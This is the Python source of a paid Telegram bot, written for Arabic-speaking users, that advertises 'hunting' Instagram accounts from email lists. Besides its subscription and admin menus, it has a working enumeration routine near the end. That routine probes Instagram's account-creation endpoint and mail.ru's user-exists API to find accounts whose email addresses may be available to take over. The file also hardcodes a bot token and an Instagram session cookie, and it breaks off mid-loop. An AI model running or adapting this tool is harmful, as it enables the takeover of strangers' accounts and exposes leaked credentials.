import os

import secrets

import datetime

import requests

import random

import telebot

import threading

from telebot import *

from time import sleep

import os

import random

import requests

import user_agent

import json

import uuid

import re

from user_agent import generate_user_agent

asma = False
#now = datetime.datetime.today()

#mm = str(now.month)

#dd = str(now.day)

#yyyy = str(now.year)

#hour = str(now.hour)

#mi = str(now.minute)

#ss = str(now.second)

#hours = (now.hour)

token = '6139875501:AAEqAZkvV-Bg8nydl9mxABAmYF_ePRrZ5go'

#now = datetime.datetime.today()

#now = datetime.datetime.today()

bot = telebot.TeleBot(token)

list = '1234567890poiuytrewqasfdghjklmnbvcxz'

list_num = '456789'

dergham = 5903160198, 5842261151 

gmail = 0

yahoo = 0

hotmail = 0

aol = 0

mailru = 0

bad1 = 0

bad2 = 0

bad3 = 0

bad4 = 0

bad5 = 0

bad11 = 0

bad22 = 0

bad33 = 0

bad44 = 0

bad55 = 0

bad111 = 0

bad222 = 0

bad333 = 0

bad444 = 0

bad555 = 0

bad1111 = 0

bad2222 = 0

bad3333 = 0

bad4444 = 0

bad5555 = 0

@bot.message_handler(commands=['id', 'Id', 'iD', 'ID'])

def owbe(mo):
	
	ig = mo.from_user.id
	
	a = '1234567890poiuytrewQWERTYUIOPLKJHGFDSAZXCVBNMqasdfghjklmnbvcxz'
	
	b = ''.join(random.choice(a)for i in range(22))
	
	cv = types.InlineKeyboardButton('Your Info  🎭', url=f'https://t.me/d_xiimbot?info=der{b}{ig}')
	
	xk = types.InlineKeyboardMarkup(row_width=1)
	
	xk.add(cv)
	
	bot.send_message(mo.chat.id,text=f'''<strong>
❖ - Your Id 🎭

|⌯| Id ⌯ </strong><code>{ig}</code>
<strong><s>touch to cope</s></strong>
''', parse_mode='html')

@bot.message_handler(commands=['info', 'photo'])

def send_user_info(message):
    
    user = message.chat
    
    user_info = bot.get_chat(user.id)
    
    first_name = user.first_name 
    
    last_name = message.from_user.full_name
    
    username = user.username 
    
    user_idnc = user.id
    
    bio = user_info.bio
    
    photos = bot.get_user_profile_photos(user_idnc).photos
    
    photo_file_id = None
    
    if photos:
        
        photo_file_id = photos[0][-1].file_id
    
    dev = types.InlineKeyboardButton('pro 👨‍💻', url='t.me/d_xiim')
    
    bb = types.InlineKeyboardMarkup(row_width=1);bb.add(dev)
    
    bot.send_photo(chat_id=message.chat.id, photo=photo_file_id, caption=f'''<strong>
❖ - Your Info 🎭

[⌯] Name ⌯ </strong>{last_name}
<strong>[⌯] User ⌯ </strong>@{username}
<strong>[⌯] Id ⌯ <code>{user_idnc}</code>
[⌯] Bio ⌯ </strong>{bio}
    ''', parse_mode='html', reply_markup=bb)


    
@bot.message_handler(commands=['read', 'r'])

def raddd(re):
		
	with open('banid.txt', "r") as yyy:
			
		yyy.read()
			
		yyy.readline()
			
		yyy.readlines()
			
	with open('sh.txt', "r") as pe:
			
		pe.read()
			
		pe.readline()
			
		pe.readlines()
			
		with open('userss.txt', "r") as kd:
				
			kd.read()
				
			kd.readline()
				
			kd.readlines()
			
		with open('vip.txt', "r") as jk:
			
			jk.read()
			
			jk.readline()
			
			jk.readlines()
			
		bot.send_message(re.chat.id,text='تم إعادة قرائه الملفات')
		
@bot.message_handler(commands=['start'])

def start(m):
	
	if bot.get_chat_member(f"@course_py",m.from_user.id).status == "left":
		
		den = types.InlineKeyboardButton('my channel', url='t.me/course_py')
		
		ka = types.InlineKeyboardButton('bot channel', url='t.me/botatkom')
		
		kc = types.InlineKeyboardMarkup(row_width=2);kc.add(den, ka)
		
		bot.send_message(m.chat.id,f'''<strong>
عذرا عزيزي 📛
عليك الاشتراك بقناة المطور و قناة البوت فضلا
ليصلك كل جديد✨
</strong>
		''', parse_mode='html', reply_markup=kc)
		
		return
		
	elif bot.get_chat_member(f"@botatkom",m.from_user.id).status == "left":
		
		den = types.InlineKeyboardButton('my channel', url='t.me/course_py')
		
		ka = types.InlineKeyboardButton('bot channel', url='t.me/botatkom')
		
		kc = types.InlineKeyboardMarkup(row_width=2);kc.add(den, ka)
		
		bot.send_message(m.chat.id,f'''<strong>
عذرا عزيزي 📛
عليك الاشتراك بقناة المطور و قناة البوت فضلا
ليصلك كل جديد✨
</strong>
		''', parse_mode='html', reply_markup=kc)
		
		return
		
	else:
		
		pass
	
	userss = open('userss.txt', "r").read()
	
	na = m.from_user.full_name
	
	p = m.from_user.id
	
	if str(p) in userss:
		
		pass
		
	else:
		
		with open('userss.txt', "a") as ks:
			
			ks.write(f'{p}\n')
			
	with open('banid.txt', "r") as bd:
			
		banid = bd.read()
		
		if str(p) in banid:
				
			bot.send_message(m.chat.id,text='انت محظور')
				
		else:
			
			with open('sh.txt', "r") as ss:
				
				sh = ss.read()
				
			if not str(p) in sh:
							
					hks = types.InlineKeyboardButton(' develover   ϟ ', url='t.me/d_xiim')
							
					mon = types.InlineKeyboardButton('أسعار الاشتراك 💲', callback_data='mon')
							
					pse = types.InlineKeyboardMarkup(row_width=1);pse.add(mon, hks)
							
					bot.send_message(m.chat.id,text='''
					<strong>
عذرا عزيزي📛🤖

هذه البوت مدفوع قُم بمراسله المطور لتفعيل الاشتراك
</strong>









''', parse_mode='html', reply_markup=pse)
							
			else:
								
				b1 = types.InlineKeyboardButton('👾 gmail 👾', callback_data='b1')
				
				b2 = types.InlineKeyboardButton('👾 yahoo 👾', callback_data='b2')
				
				b3 = types.InlineKeyboardButton('👾 hotmail 👾', callback_data='b3')
				
				b4 = types.InlineKeyboardButton('👾 mail.ru 👾', callback_data='b4')
				
				b5 = types.InlineKeyboardButton('👾 aol 👾', callback_data='b5')
				
				b6 = types.InlineKeyboardButton('👾  👾', callback_data='b6')
				
				v = types.InlineKeyboardButton('👾 all domen 👾', callback_data='v')
				
				js = types.InlineKeyboardMarkup(row_width=2);js.add(b1,b2,b3,b4,b5,b6,v)
				
				bot.send_message(m.chat.id,text=f'''<strong>
اهلا بك {na} ،
البوت مخصص لصيد حسابات انستقرام عن طريق لسته✨
اخِتر القسم ثم ارسل لسته تحتوي على الدومين نفسه فضلا🖤</strong>''', parse_mode='html', reply_markup=js)
							
@bot.callback_query_handler(func=lambda call:True)

def call1(call):
	
	if call.data == 'mon':
		
		mn = types.InlineKeyboardButton('develover   ϟ', url='t.me/d_xiim')
		
		mnn = types.InlineKeyboardButton('بوت تواصل محظورين', url='t.me/d_xiimbbot')
		
		ob = types.InlineKeyboardButton('رجوع  𖡋', callback_data='ob')
		
		ido = types.InlineKeyboardMarkup(row_width=2);ido.add(mn, mnn)
		
		ai = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - اسعار الاشتراك في بوت صيد متاحات

⌯ قسم العادي
  - <s>مميزاته</s> :
    1 - فحص لسته انستقرام موحد (كل دومين يفحص ملف واحد )
    2 - بدون حظر
    3 - فحص دقيق

<s>⌯ أسعار قسم العادي</s>
رصيد $
يوم واحد ≈ 3$
يومين ≈ 5$
اسبوع ≈ 14$
اسبوعين ≈ 25$
شهر ≈ 40$

نقاط مليار°
يوم ≈ 8.000
يومين ≈ 15.000
اسبوع ≈ 40.000
شهر ≈ 120.000

<s>⌯ أسعار قسم المميز</s>
رصيد$
يوم ≈ 5$
يومين ≈ 9$
اسبوع ≈ 27$
شهر ≈ 75$

نقاط°
يوم ≈ 12.000
يومين ≈ 20.000
اسبوع ≈ 50.000
شهر ≈ 160.000

أقبل بدل تفعيل بالساعات أو يوم 
مثل حسابات أو مقابل مرتب يكون تفعيل بالساعات حسب المقابل

ملاحظات :
	قسم العادي يفحص كل دومين على حده مثلا gmail يفحص فقط gmail كذلك باقي الأقسام 

قسم المميز ترسل ملف أو لسته و يفحص اللسته بكل الدومينات الموجوده مثلا ترسل ملف راح يبدي يفحص جميع الدومينات 
إذا كان متاح gmail يرسل متاح gmail
إذا كان متاح yahoo يرسل متاح ياهو
كذلك باقي الدومينات
يعني ترسل ملف و تكعد الصبح تشوف متاحات من جميع دومينات

للاشتراك تواصل على الخاص او بوت التواصل تحت
</strong>
		''', parse_mode='html', reply_markup=ido)
	
	elif call.data == 'cn':
		
		b1 = types.InlineKeyboardButton('👾 gmail 👾', callback_data='b1')
		
		b2 = types.InlineKeyboardButton('👾 yahoo 👾', callback_data='b2')
		
		b3 = types.InlineKeyboardButton('👾 hotmail 👾', callback_data='b3')
		
		b4 = types.InlineKeyboardButton('👾 mail.ru 👾', callback_data='b4')
		
		b5 = types.InlineKeyboardButton('👾 aol 👾', callback_data='b5')
		
		b6 = types.InlineKeyboardButton('👾  👾', callback_data='b6')
		
		v = types.InlineKeyboardButton('👾 all domen 👾', callback_data='v')
		
		js = types.InlineKeyboardMarkup(row_width=2);js.add(b1,b2,b3,b4,b5,b6,v)
		
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
اهلا بك {na} ،
البوت مخصص لصيد حسابات انستقرام عن طريق لسته✨
اخِتر القسم ثم ارسل لسته تحتوي على الدومين نفسه فضلا🖤</strong>''', parse_mode='html', reply_markup=js)
		asma = True

	elif call.data == 'ob':
		
		hks = types.InlineKeyboardButton(' develover   ϟ ', url='t.me/d_xiim')
		
		mon = types.InlineKeyboardButton('أسعار الاشتراك 💲', callback_data='mon')
		
		pse = types.InlineKeyboardMarkup(row_width=1);pse.add(mon, hks)
		
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='''
					<strong>
عذرا عزيزي📛🤖

هذه البوت مدفوع قُم بمراسله المطور لتفعيل الاشتراك
</strong>









''', parse_mode='html', reply_markup=pse)
	
	elif call.data == 'ksj':
		
		l1 = types.InlineKeyboardButton('حظر عضو', callback_data='l1') ####
		
		l2 = types.InlineKeyboardButton('إلغاء حظر عضو', callback_data='l2') ####
		
		l3 = types.InlineKeyboardButton('تفعيل اشتراك( عادي )', callback_data='l3') ####
		
		l4 = types.InlineKeyboardButton('إلغاء تفعيل اشتراك ( عادي )', callback_data='l4') ####
		
		l5 = types.InlineKeyboardButton('تفعيل اشتراك ( مميز )', callback_data='l5') ####
		
		l6 = types.InlineKeyboardButton('إلغاء تفعيل اشتراك ( مميز )', callback_data='l6') ####
		
		l7 = types.InlineKeyboardButton('الإحصائيات', callback_data='l7') ####
		
		l8 = types.InlineKeyboardButton('الاذاعه', callback_data='l8') ####
		
		lll = types.InlineKeyboardMarkup(row_width=2)
		
		lll.add(l2,l1,l4,l3,l6,l5,l7,l8)
		
		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text='اهلا مطوري👨‍💻🖤', reply_markup=lll)
		
	elif call.data == 'l3':
		
		ksj = types.InlineKeyboardButton('رجوع  𖡋', callback_data='ksj')
		
		jf = types.InlineKeyboardMarkup(row_width=1)
		
		jf.add(ksj)
		
		ll3 = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - ارسل ايدي العضو لتفعيل الاشتراك
</strong>
		''', parse_mode='html', reply_markup=jf)
		
		bot.register_next_step_handler(ll3, ll33)
		
	elif call.data == 'l5':
		
		ksj = types.InlineKeyboardButton('رجوع  𖡋', callback_data='ksj')
		
		jf = types.InlineKeyboardMarkup(row_width=1)
		
		jf.add(ksj)
		
		kb = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - ارسل ايدي العضو لتفعيل اشتراك مميز
</strong>
		''', parse_mode='html', reply_markup=jf)
		
		bot.register_next_step_handler(kb, ao)
		
	elif call.data == 'l6':
		
		ksj = types.InlineKeyboardButton('رجوع  𖡋', callback_data='ksj')
		
		jf = types.InlineKeyboardMarkup(row_width=1)
		
		jf.add(ksj)
		
		px = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - ارسل ايدي العضو لإلغاء تفعيل اشتراك مميز
</strong>
		''', parse_mode='html', reply_markup=jf)
		
		bot.register_next_step_handler(px, xp)
		
	elif call.data == 'l1':
		
		ksj = types.InlineKeyboardButton('رجوع  𖡋', callback_data='ksj')
		
		jf = types.InlineKeyboardMarkup(row_width=1)
		
		jf.add(ksj)
		
		vb = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - ارسل ايدي العضو لحظره
</strong>
		''', parse_mode='html', reply_markup=jf)
		
		bot.register_next_step_handler(vb, ub)
		
	elif call.data == 'l2':
		
		ksj = types.InlineKeyboardButton('رجوع  𖡋', callback_data='ksj')
		
		jf = types.InlineKeyboardMarkup(row_width=1)
		
		jf.add(ksj)
		
		kf = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - ارسل ايدي العضو لإلغاء الحظر
</strong>
		''', parse_mode='html', reply_markup=jf)
		
		bot.register_next_step_handler(kf, sb)
		
	elif call.data == 'l4':
		
		ksj = types.InlineKeyboardButton('رجوع  𖡋', callback_data='ksj')
		
		jf = types.InlineKeyboardMarkup(row_width=1)
		
		jf.add(ksj)
		
		fn = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - ارسل ايدي العضو لإلغاء الاشتراك العادي
</strong>
		''', parse_mode='html', reply_markup=jf)
		
		bot.register_next_step_handler(fn, xnxx)
		
	elif call.data == 'l7':
		
		with open('banid.txt', "r") as yyy:
			
			yyy.read()
				
			yyy.readline()
				
			bbaj = yyy.readlines()
			
			bban = int(len(bbaj))
				
		with open('sh.txt', "r") as pe:
				
			pe.read()
				
			pe.readline()
				
			sshn = pe.readlines()
			
			ssh = str(len(sshn))
				
		with open('userss.txt', "r") as kd:
					
			kd.read()
					
			kd.readline()
						
			uuns = kd.readlines()
			
			uus = str(len(uuns))
		with open('vip.txt', "r") as jk:
				
			vvnp = jk.readlines()
			
			vvip = str(len(vvnp))
			
			jk.read()
			
			jk.readline()
			
		p1 = types.InlineKeyboardButton('قائمه المستخدمين', callback_data='p1')
		
		p2 = types.InlineKeyboardButton('قائمه مشتركين عادي', callback_data='p2')
		
		p3 = types.InlineKeyboardButton('قائمه مشتركين vip', callback_data='p3')
		
		p4 = types.InlineKeyboardButton('قائمه المحظورين', callback_data='p4')
		
		ppp = types.InlineKeyboardButton('رجوع ↩️')
		
		ksj = types.InlineKeyboardButton('رجوع  𖡋', callback_data='ksj')
		
		p5 = types.InlineKeyboardMarkup(row_width=2);p5.add(p1,p2,p3,p4,ksj)
		
		oby = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - الإحصائيات :

|⌯| عدد المستخدمين الكلي : {uus}
|⌯| عدد مشتركين العادي : {ssh}
|⌯| عدد مشتركين مميز : {vvip}
|⌯| عدد المحظورين : {bban}
</strong>
		''', parse_mode='html', reply_markup=p5)
		return
		
	elif call.data == 'p1':
		with open('userss.txt', "r") as nd:
			so = nd.read()
		back = types.InlineKeyboardButton('عودة️  𖡋', callback_data='back')
		n = types.InlineKeyboardMarkup(row_width=1)
		n.add(back)
		orn = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - قائمه المستخدمين 
{so}
</strong>
		''', parse_mode='html', reply_markup=n)
		return
	
	elif call.data == 'p2':
		with open('sh.txt', "r") as ci:
			sn= ci.read()
		back = types.InlineKeyboardButton('عودة️  𖡋', callback_data='back')
		n = types.InlineKeyboardMarkup(row_width=1)
		n.add(back)
		orn = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - قائمه المشتركين ; النوع : عادي
{sn}
</strong>
		''', parse_mode='html', reply_markup=n) 
		return
	
	elif call.data == 'p3':
		with open('vip.txt', "r") as xi:
			cb = xi.read()
		back = types.InlineKeyboardButton('عودة️  𖡋', callback_data='back')
		n = types.InlineKeyboardMarkup(row_width=1)
		n.add(back)
		orn = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - قائمه المشتركين ; النوع : مميز
{cb}
</strong>
		''', parse_mode='html', reply_markup=n)
		
		return
	elif call.data == 'p4':
		
		with open('banid.txt', "r") as zx:
			
			er = zx.read()
			
		back = types.InlineKeyboardButton('عودة️  𖡋', callback_data='back')
		
		n = types.InlineKeyboardMarkup(row_width=1)
		
		n.add(back)
		
		orn = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - قائمه المحظورين
{er}
</strong>
		''', parse_mode='html', reply_markup=n)
		return
	
	elif call.data == 'back':
		
		with open('banid.txt', "r") as yyy:
			
			yyy.read()
				
			yyy.readline()
				
			bbaj = yyy.readlines()
			
			bban = len(bbaj)
				
		with open('sh.txt', "r") as pe:
				
			pe.read()
				
			pe.readline()
				
			sshn = pe.readlines()
			
			ssh = len(sshn)
				
		with open('userss.txt', "r") as kd:
					
			kd.read()
					
			kd.readline()
						
			uuns = kd.readlines()
			
			uus = len(uuns)
			
		with open('vip.txt', "r") as jk:
				
			vvnp = jk.readlines()
			
			vvip = len(vvnp)
			
			jk.read()
			
			jk.readline()
			
		p1 = types.InlineKeyboardButton('قائمه المستخدمين', callback_data='p1')
		
		p2 = types.InlineKeyboardButton('قائمه مشتركين عادي', callback_data='p2')
		
		p3 = types.InlineKeyboardButton('قائمه مشتركين vip', callback_data='p3')
		
		p4 = types.InlineKeyboardButton('قائمه المحظورين', callback_data='p4')
		
		ksj = types.InlineKeyboardButton('رجوع  𖡋', callback_data='ksj')
		
		p5 = types.InlineKeyboardMarkup(row_width=2);p5.add(p1,p2,p3,p4, ksj)
		
		oby = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - الإحصائيات :

|⌯| عدد المستخدمين الكلي : {uus}
|⌯| عدد مشتركين العادي : {ssh}
|⌯| عدد مشتركين مميز : {vvip}
|⌯| عدد المحظورين : {bban}
</strong>
		''', parse_mode='html', reply_markup=p5)
		return
	elif call.data == 'l8':
		
		ksj = types.InlineKeyboardButton('رجوع  𖡋', callback_data='ksj')
		
		jf = types.InlineKeyboardMarkup(row_width=1)
		
		jf.add(ksj)
		
		obyv = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - هذه القسم في صيانه 🤖🛠️
</strong>
		''', parse_mode='html', reply_markup=jf)
	elif call.data == 'b4':
		
		vl = types.InlineKeyboardButton('الغاء & عودة  𖡋', callback_data='vl')
		
		cn = types.InlineKeyboardMarkup(row_width=1)
		
		cn.add(vl)
		
		ail = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - ارسل الملف ليتم الفحص ✨🖤
</strong>
		''', parse_mode='html', reply_markup=cn)
		
		bot.register_next_step_handler(ail, ali)
	elif call.data == 'b1':
		hs = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - ارسل الملف ليتم الفحص ✨🖤
</strong>
		''', parse_mode='html')
		bot.register_next_step_handler(hs,nf)
	elif call.data == 'v':
		
		vl = types.InlineKeyboardButton('الغاء & عودة  𖡋', callback_data='vl')
		
		cn = types.InlineKeyboardMarkup(row_width=1)
		
		cn.add(vl)
		
		dfl = call.from_user.id
		
		ww = open('vip.txt', "r").read()
		
		if not str(dfl) in ww:
			
			ci = types.InlineKeyboardButton('dev °', url='t.me/d_xiim')
			
			rn = types.InlineKeyboardButton('bot', url='t.me/d_xiimbbot')
			
			jd = types.InlineKeyboardButton('رجوع ✖️', callback_data='jd')
			
			xl = types.InlineKeyboardMarkup(row_width=2)
			
			xl.add(ci,rn)
			
			kq = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - عذرا عزيزي هذه القسم vip راسل المطور لتفعيل الاشتراك
</strong>
		''', parse_mode='html', reply_markup=xl)
		
		else:
				
				il = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f'''<strong>
❖ - ارسل الملف ليتم الفحص ✨🖤
</strong>
		''', parse_mode='html', reply_markup=cn)
		
				bot.register_next_step_handler(il, rm)
@bot.message_handler(commands=['admen', 'admn', 'a', 'ad', 'adm'])

def fo(ass):
	
	lol = ass.from_user.id
	
	#@d_xiim - 5903160198 
	#@zskkaf - 6019145503
	if lol == 5903160198 or lol == 6019145503:
		
		l1 = types.InlineKeyboardButton('حظر عضو', callback_data='l1') ####
		
		l2 = types.InlineKeyboardButton('إلغاء حظر عضو', callback_data='l2') ####
		
		l3 = types.InlineKeyboardButton('تفعيل اشتراك( عادي )', callback_data='l3') ####
		
		l4 = types.InlineKeyboardButton('إلغاء تفعيل اشتراك ( عادي )', callback_data='l4') ####
		
		l5 = types.InlineKeyboardButton('تفعيل اشتراك ( vip )', callback_data='l5') ####
		
		l6 = types.InlineKeyboardButton('إلغاء تفعيل اشتراك ( vip )', callback_data='l6') ####
		
		l7 = types.InlineKeyboardButton('الإحصائيات', callback_data='l7') ####
		
		l8 = types.InlineKeyboardButton('الاذاعه', callback_data='l8') ####
		
		lll = types.InlineKeyboardMarkup(row_width=2)
		
		lll.add(l2,l1,l4,l3,l6,l5,l7,l8)
		
		bot.send_message(ass.chat.id,text='اهلا مطوري👨‍💻🖤', reply_markup=lll)
		return
		
	else:
		
		pass
		
def ll33(di):
	
	idsh = di.text
	
	with open('sh.txt', "a") as je:
		
		je.write(f'{idsh}\n')
		
	bot.send_message(di.chat.id,text='تم تفعيل اشتراك اضغط /r  أو /start')
	
def ao(hl):
	try:
		idv = int(hl.text)
	except:
		bot.send_message(hl.chat.id,text='ايدي غير صالح')
	with open('vip.txt', "a") as jje:
		
		jje.write(f'{idv}\n')
		
	bot.send_message(hl.chat.id,text='تم تفعيل اشتراك اضغط /r  أو /start')
	try:
		kag = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={idv}&text=تم تفعيل اشتراك اضغط /start او /read")
	except:
		bot.send_message(hl.chat.id, text='لم يتم اعلام المستخدم بأنه تم تفعيل الاشتراك vip')
def ub(iw):
	
	idnv = iw.text
	
	with open('banid.txt', "a") as lje:
		
		lje.write(f'{idnv}\n')
		
	bot.send_message(iw.chat.id,text='تم حظر العضو بنجاح')
	
	try:
		
		kg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={idnv}&text=تم حظرك من البوت")
		
	except:
		
		bot.send_message(iw.chat.id,text='تم حظر العضو ولكن يم يتم ارسال رساله له')


def so(ol):
	
	try:
		
		user_id = int(ol.text)
		
	except:
		
		bot.send_message(ol.chat.id,text='ارسل ايدي صالح ')
		
	filename = 'sh.txt'
	
	with open(filename, 'r') as f:
		
		lines = f.readlines()
	
	with open(filename, 'w') as f:
		
		for line in lines:
		   		
		   		if str(user_id) in line:
		   			
		   			continue
		   			
		   		f.write(line)
		   		
	bot.send_message(ol.chat.id,text=f'''<strong>
تم الغاء تفعيل اشتراك العضو : {user_id}
نوع الاشتراك : عادي
</strong>
	''', parse_mode='html')
	
	try:
		
		vw = requests.post(f"""https://api.telegram.org/bot{token}/sendMessage?chat_id={user_id}&text=
لقد انتهى تفعيل الاشتراك
نوع الاشتراك : عادي""")

	except:
		
		bot.send_message(ol.chat.id,text='خطا في إرسال للعضو')
		
def sb(bs):
	
	try:
		
		user_id = int(bs.text)
		
	except:
		
		bot.send_message(bs.chat.id,text='ارسل ايدي صالح ')
		
	filename = 'banid.txt'
	
	try:
		
		with open(filename, 'r') as f:
			
			lines = f.readlines()
		
		with open(filename, 'w') as f:
			
			for line in lines:
			   		
			   		if str(user_id) in line:
			   			
			   			continue
			   			
			   		f.write(line)
			   		
	except:
		
		bot.send_message(bs.chat.id,text='هذه العضو غير محظور')
		   		
	try:
		
		khg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={user_id}&text=تم الغاء حظرك اضغط /start")
		
		bot.send_message(bs.chat.id,text='تم الغاء حظر العضو')
		
	except:
		
		bot.send_message(bs.chat.id,text='تم الغاء حظر العضو ولكن لم يستلم رساله الالغاء')

def xp(xx):
	
	try:
		
		user_i= int(xx.text)
		
	except TypeError:
		
		bot.send_message(xx.chat.id,text='ارسل ايدي صالح ')
		
	except IndexError:
		
		bot.send_message(xx.chat.id,text='ارسل ايدي صالح ')
		
	except IndentationError:
		
		bot.send_message(xx.chat.id,text='ارسل ايدي صالح ')
		
	filename = 'vip.txt'
	
	with open(filename, 'r') as f:
		
		lines = f.readlines()
	
	with open(filename, 'w') as f:
		
		for line in lines:
		   		
		   		if str(user_i) in line:
		   			
		   			continue
		   			
		   		f.write(line)
		   		
	try:
		
		bot.send_message(xx.chat.id,text=f'''<strong>
تم الغاء تفعيل اشتراك العضو : {user_i}
نوع الاشتراك : vip
</strong>
	''', parse_mode='html')
	
	except:
		
		pass
		
	try:
		vw = requests.post(f"""https://api.telegram.org/bot{token}/sendMessage?chat_id={user_i}&text=
لقد انتهى تفعيل الاشتراك
نوع الاشتراك : vip""")
	except:
		bot.send_message(xx.chat.id,text='خطا في إرسال للعضو') 
import time

@bot.message_handler(content_types=['document'])
def ali(z):
 gma = 0
 bma = 0
 ama = 0
 ema = 0
 allma = 0
 bad_p = 0
 try:
  filename = z.document.file_name
  fil = bot.get_file(z.document.file_id)
  dow = bot.download_file(fil.file_path)
  with open(filename, 'wb') as f0:
   f0.write(dow)
  p_file = open(filename, "r")
  mssg=bot.send_message(z.chat.id,text="تم تلقي ملف")
 except:
  bot.send_message(z.chat.id,text='''<strong>
عذرا لا يمكنني التعرف علي الشيء الذي ارسلته
الرجاء ارسال ملف صالح
</strong>
  ''',parse_mode='html')
  return
 with open(filename, 'r') as f1:
 	al_l = f1.readlines()
 	alll = al_l[-1]
 while True:
  s = p_file.readline().split('\n')[0]
  try:
   emai = s.split('@')[0]
   email = f'{emai}@mail.ru'
  except:
   emai = s
   email = f'{emai}@mail.ru'
  url = 'https://www.instagram.com/accounts/web_create_ajax/attempt/'
  headers = {'x-requested-with': 'XMLHttpRequest',
	'x-instagram-ajax': '1007230059',
	'x-ig-www-claim': '0',
	'x-ig-app-id': '936619743392459',
	'x-csrftoken': 'iMd8tAhvwezltsWZAVi1adkaSyB7EUzO',
	'user-agent': generate_user_agent(), 
	'sec-fetch-user': '?1',
	'sec-fetch-site': 'none',
	'sec-fetch-mode': 'navigate',
	'sec-fetch-dest': 'document',
	'sec-ch-ua-platform': '"Windows"',
	'sec-ch-ua-mobile': '?0',
	'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
	'sec-ch-prefers-color-scheme': 'light',
	'cookie': 'ig_did=735BE103-DEB8-49AD-8E6E-09C8DDAB8696; ig_nrcb=1; mid=Y0rdDwALAAF9nAJ20ejltiX0xwPD; datr=mt5KY8cDTj42n9H2F-WvsM6M; fbm_124024574287414=base_domain=.instagram.com; csrftoken=iMd8tAhvwezltsWZAVi1adkaSyB7EUzO; ds_user_id=58173081681; shbid="12243,58173081681,1711782047:01f709696fd88f95ae617bb02b5b6d15a9e8996d88f9e2d3ee8855533aedb9f4987abd92"; shbts="1680246047,58173081681,1711782047:01f7d73e9f512a0f35a524df1d0f51b48fcb0023309d321cfb9c3f54c755152397f7da58"; fbsr_124024574287414=LLfGuxN7PwilAJQ2w2bGqQmOX6p3T2JreIplqK1mKOo.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRRFRUem5mcW1BRUJDbGZHcjJSWWV5UERTd3RhSEJTM2lsTERTaUdXZF9fTHdCaFp2VV9ndVltWEJINE9DenUxamJCbWh3TWtSVmdUOXRyWDVWTHlpcGFFY01fMFlSb3pHOVRibWE0NkRMMm9GTE9FWmJhdzhSNF84c2hDZl9FZGtwb2V4MmtSYTIzNm8xa3A2LWFzZGNRVVk4eVFSU3NwQzlhaEI4NFBYWk1FMVA4aUt5aEIzWGlXOGxjaGJ0Y1R2WEdsUnRBNl91MnlCNExxN09PRjdXZG1DT2p6c2lBM3BsZEY4X2FjX181OGpTUDBTSC1DS0dQMHZYYldlaVBDSWs2ell4SGtkRmNTVkdIUE5sTDB3aUk4azBNcVdSbl9nbXk5RWptV282dmRBQlpVTTVabmJwYXFOT2dLem9ndzRDU2x4WUI3clQtUzdjaWJUbGNqWTlZIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUVsVmlXS2JhMkJlRTEwSlBoS01iNVVsdFlhYUlKY05zZVdZWkFodFpCWkNUcElmOTZrNk9nTE9mTnZ1RjdMcUs5WkMyUk1NUWxCQXJPNzVuWkE3U3JLcEtLR3JsRDFEMU5QOWZ5MkxNZkQzeHNINGpMeG9tQUtoRGRnUW1Ea2dzNk10TFNVSEVQbVJFWkFXZkJ5Y1pDbGZmTmp5eGR5U1Jtb3JyN1N2SXN4Y3g2OTdxSVZSSXNaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjgwNTQwMzI3fQ',
	'content-type': 'application/x-www-form-urlencoded',
	'content-length': '291',
	'accept-language': 'en-US,en;q=0.9',
	'accept-encoding': 'gzip, deflate, br',
	'accept': '*/*'}
  timg = str(time.time()).split('.')[0] 
  data = {'trustedDeviceRecords': '{}',
	'optIntoOneTap': 'false',
	'queryParams': '{}',
	'username': f'{email}',
	'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timg}:byvdsvbfgvt7'} 
  req = requests.post(url, headers=headers, data=data).text
  if '"user":true,' in req:
   gma +=1
   allma +=1
   headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'}
   data = {'email': email}
   res= requests.post('https://account.mail.ru/api/v1/user/exists', headers=headers, data=data, timeout=5)
   
   if '"body":{"exists":true,' in res.text:
    ama +=1
    allma +=1
